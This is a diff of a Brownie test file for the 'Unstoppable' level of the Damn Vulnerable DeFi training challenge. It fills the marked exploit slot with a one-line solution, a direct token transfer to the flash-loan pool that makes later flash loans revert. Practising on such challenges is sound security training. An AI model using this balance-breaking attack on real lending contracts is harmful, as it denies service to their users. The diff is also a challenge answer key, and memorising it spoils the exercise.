@@ -9,8 +9,6 @@ from brownie import UnstoppableLender, ReceiverUnstoppable, DamnValuableToken, W
 TOKENS_IN_POOL = Wei("1000000 ether")
 INITIAL_ATTACKER_TOKEN_BALANCE = Wei("100 ether")
 
-# DEPLOYER = accounts
-# ATTACKER = accounts[1]
 
 def setup_contracts():
     deployer = accounts[0]
@@ -45,10 +43,9 @@ def test_attacking_the_contract():
     receiver_contract.executeFlashLoan(10, {"from": quagmire})
 
     # CODE YOUR EXPLOIT HERE 😈
-    
+    token.transfer(pool, INITIAL_ATTACKER_TOKEN_BALANCE, {"from": attacker})
 
     # SUCCESS CONDITIONS 🕺
-
     # It's no longer possible to execute flash loans
     with reverts():
         receiver_contract.executeFlashLoan(10, {"from": quagmire})
